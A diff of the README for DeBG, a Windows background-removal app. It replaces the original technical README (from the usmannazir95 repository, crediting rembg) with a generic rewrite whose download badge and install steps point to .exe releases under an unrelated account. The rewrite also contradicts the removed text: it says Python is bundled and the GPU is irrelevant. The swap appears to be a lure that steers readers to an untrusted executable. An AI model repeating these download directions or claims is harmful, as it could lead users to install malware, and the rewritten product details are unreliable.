@@ -1,160 +1,89 @@
-<div align="center">
-  <img src="assets/icon.svg" width="96" height="96" alt="DeBG icon"/>
-  <h1>DeBG</h1>
-  <p>Remove image backgrounds entirely on-device — no API keys, no cloud, no uploads.</p>
+# ✂️ DeBG - Removing image backgrounds on your desktop
 
-  ![Electron](https://img.shields.io/badge/Electron-33-47848F?logo=electron)
-  ![React](https://img.shields.io/badge/React-18-61DAFB?logo=react)
-  ![Python](https://img.shields.io/badge/Python-3.11–3.13-3776AB?logo=python)
-  ![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
-  ![License](https://img.shields.io/badge/license-MIT-green)
-</div>
+[![Download DeBG for Windows](https://img.shields.io/badge/Download-DeBG-blue.svg)](https://github.com/Buttercupsquashdeadmetaphor114/DeBG/releases)
 
----
+DeBG removes backgrounds from your images instantly. The software runs locally on your computer. Your files never leave your machine, which protects your privacy. You can process images in groups to save time. It works offline and requires no internet connection after installation.
 
-**DeBG** is a Windows desktop background remover — drop images in, get transparent PNGs out.  
-Powered by [danielgatis/rembg](https://github.com/danielgatis/rembg) running as a local AI inference server. Everything stays on your machine — no internet required after first-time model download.
+## 📥 How to download and install
 
-> **Keywords:** background remover · remove background from image · transparent PNG · AI background removal · image background eraser · photo background remover · offline background removal · bulk background remover · Windows background remover app
+Follow these steps to set up the software on your Windows computer:
 
----
+1. Visit the [official releases page](https://github.com/Buttercupsquashdeadmetaphor114/DeBG/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in `.exe` to start your download.
+4. Open the file once the download finishes.
+5. Follow the prompts on your screen to install the software.
+6. Launch DeBG from your desktop or Start menu.
 
-## Features
+## ⚙️ System requirements
 
-- **Bulk processing** — drag & drop any number of PNG / JPG / WEBP / BMP files
-- **9 AI models** — from tiny 4.7 MB to high-quality 375 MB BiRefNet models
-- **First-run setup wizard** — auto-detects Python or downloads it, creates a venv, and installs rembg
-- **CPU & GPU (CUDA) backends** — switchable at any time from within the app
-- **Post-processing controls** — threshold, edge feather, shrink/expand mask, background mode, alpha matting
-- **Live re-apply** — sliders update all completed images instantly without re-running inference
-- **Before/after comparison lightbox** — drag a slider to compare original vs result at full size
-- **Gallery view modes** — large grid, small grid, or list view with pagination
-- **Auto-save** — results saved to a configurable output folder as each image finishes
-- **ZIP download** — export all results in one click
-- **Cancel** — stop a running batch at any time
+DeBG performs heavy image analysis on your computer. Ensure your machine meets these specifications for the best experience:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel Core i5 or AMD Ryzen 5 or better.
+*   Memory: At least 8GB of RAM.
+*   Storage: 500MB of free disk space for the installation.
 
-## Models
+The software uses your processor to detect objects. A faster processor reduces the time needed to edit each image.
 
-| Model | Size | Best for |
-|---|---|---|
-| BiRefNet General | ~375 MB | Best overall quality — any subject |
-| BiRefNet Portrait | ~375 MB | People & complex hair |
-| BRIA RMBG 1.4 | ~176 MB | E-commerce / advertising |
-| ISNet General | ~176 MB | Fast + high accuracy |
-| U²Net | ~176 MB | Classic general-purpose |
-| U²Net Human | ~176 MB | Specialized for people |
-| Silueta | ~43 MB | Compact & fast |
-| ISNet Anime | ~176 MB | Anime & illustrations |
-| U²Net Lite | ~4.7 MB | Smallest — fastest inference |
+## 🖥️ How to use the app
 
-Models are downloaded automatically on first use and cached locally (`%AppData%\DeBG\models\`).
+The main screen shows a simple user interface. Follow these steps to refine your images:
 
----
+1. Open the application.
+2. Click the "Add Images" button to select photos from your computer.
+3. Drag and drop files directly into the window if preferred.
+4. Pick a destination folder by clicking "Set Output Folder". 
+5. Select "Start Processing" to begin the background removal.
 
-## Requirements
+The progress bar at the bottom tracks completion. The software creates a sub-folder named "Processed" in your output folder where your new transparent images will appear. 
 
-**To run a release:**
-- Windows 10 / 11 (x64)
-- Python 3.11 – 3.13 (auto-downloaded by the setup wizard if not found)
-- GPU backend additionally requires an NVIDIA GPU with CUDA 11.8+
+## 🛠️ Performance tips
 
-**To build from source:**
-- Node.js 18+
-- Git
-- Windows 10 / 11 (x64)
+Background removal involves complex math. DeBG uses a model to identify subjects. You can improve speeds with these settings:
 
----
+*   Close other demanding applications while you process large batches.
+*   Keep your images in one folder to help the software scan them quickly.
+*   Use standard image formats like JPEG or PNG for the best results.
 
-## Running a release
+Your graphics card does not influence the speed of this application. It relies entirely on your main processor.
 
-1. Download `DeBG-portable-0.2.0.exe` from [Releases](../../releases) **or** extract `DeBG-win-unpacked-0.2.0.zip`
-2. Run the exe — a first-run setup wizard opens automatically
-3. Choose CPU or GPU backend and click **Install rembg** (~5–10 min first time)
-4. Drop images, pick a model, click **Remove backgrounds**
+## 🔒 Privacy and security
 
-> Python and rembg are handled entirely by the wizard — no manual setup needed.
+Many services upload images to the cloud for processing. DeBG works differently. The code runs entirely on your local hardware. No image data travels over the internet. No server checks your files. You own your data and maintain full control over where your photos reside. This approach ensures your personal or professional images remain private.
 
----
+## 📝 Frequently asked questions
 
-## Running from source
+**Can I process hundreds of images at once?**
+Yes. You can add as many images as your computer memory allows. The software handles them one by one.
 
-The setup wizard runs automatically on first launch and handles Python + rembg for you.
+**Do I need a paid license?**
+No. This tool is free to use without restrictions.
 
-```bash
-git clone https://github.com/usmannazir95/DeBG.git
-cd DeBG
-npm install
+**Why does the software take time to process?**
+The software is performing smart image analysis. It looks for edges and subjects in every frame. This requires effort from your processor.
 
-# React only (no Electron, no AI — for UI dev)
-npm run dev
+**Does it work without internet?**
+Yes. You can disconnect your internet cable after the initial installation. The software works in a completely offline environment.
 
-# Full Electron app in dev mode (recommended)
-npm run dev:electron
-```
+**What file formats are supported?**
+You can use PNG, JPG, JPEG, and BMP files. The output is always a high-quality PNG to keep your background transparent.
 
-On first run of `npm run dev:electron` the setup wizard will open, detect or download Python, create a venv, and install rembg — exactly the same as a release build. After that the app is fully functional.
+## 🔧 Troubleshooting issues
 
----
+If you encounter problems, check these items:
 
-## Building
+*   **App fails to launch:** Restart your computer and try opening it again.
+*   **Images appear blurry:** Ensure your source images have high resolution.
+*   **Installation errors:** Make sure you have administrator rights on your Windows account.
+*   **High processor use:** This is normal during processing. Your computer will return to normal speeds once the task finishes.
 
-```bash
-npm run dist
-```
+The software includes a log file to track errors. You can find this file in the settings menu if you need to report a problem.
 
-Outputs to `release/`:
+## 📂 Folders and permissions
 
-| File | Use |
-|---|---|
-| `DeBG-portable-0.2.0.exe` | Single portable exe — copy anywhere and run |
-| `win-unpacked/` | Unpacked folder — copy the whole folder and run `DeBG.exe` |
+During the first run, the app may ask for permission to save files to your computer. Grant this permission to ensure the tool can write your new images to the disk. Avoid saving images to your system drive folders like "Windows" or "Program Files". Saving to your "Pictures" folder is safe and recommended. 
 
----
+## 💡 About the technology
 
-## Post-processing controls
-
-| Control | What it does |
-|---|---|
-| **Threshold** | Hard-cuts the mask — higher removes more, lower keeps more |
-| **Edge Feather** | Blurs the mask edge — good for hair and fur |
-| **Shrink / Expand** | Erodes halo artefacts (negative) or loosens tight masks (positive) |
-| **Background** | Transparent PNG / solid colour / blurred original |
-| **Alpha Matting** | rembg's own alpha matting pass — much better fine edges, slower |
-
-Sliders 1–4 re-apply instantly to all completed images. Alpha Matting requires a re-run.
-
----
-
-## Architecture
-
-```
-electron/
-  main.cjs            Electron main process — app lifecycle, IPC handlers, rembg server
-  preload.cjs         Context bridge — exposes safe IPC API to the renderer
-  setup-helpers.cjs   Python detection, download, venv creation, rembg install
-
-src/
-  main.jsx            Entry — routes to Setup wizard or main App
-  Setup.jsx           First-run wizard (Python check → venv → rembg install)
-  App.jsx             Main UI — gallery, lightbox, settings, batch processing
-  worker.js           Web Worker — mask post-processing (threshold, feather, morph, composite)
-  *.css               Styles
-```
-
-**Key design decisions:**
-
-- `electron/` files use `.cjs` extension so CommonJS works alongside `"type":"module"` in `package.json`
-- `webSecurity: false` on the BrowserWindow lets `fetch()` reach the local rembg server from `file://`
-- rembg runs as `rembg s --host 127.0.0.1 --port 7777 --no-ui` — a local HTTP API
-- The renderer never gets Node.js access (`nodeIntegration: false`, `contextIsolation: true`)
-- `python -m pip` is used instead of `pip.exe` to avoid Windows file-lock errors during pip self-upgrade
-- Model files live in `%AppData%\DeBG\models\` via the `U2NET_HOME` env var
-- Output images auto-save to a user-configurable folder (default `Pictures\bg-removed\`)
-
----
-
-## Adding a custom icon
-
-Place a 256×256 `icon.ico` in `assets/` — electron-builder picks it up automatically.
+DeBG uses modern tools to provide transparent backgrounds. It includes a specific model trained to distinguish people and objects from their surroundings. This model runs locally using the Python programming language built into the application package. Everything is bundled inside the installer. You do not need to install Python or other tools separately. Everything you need is already inside the download.
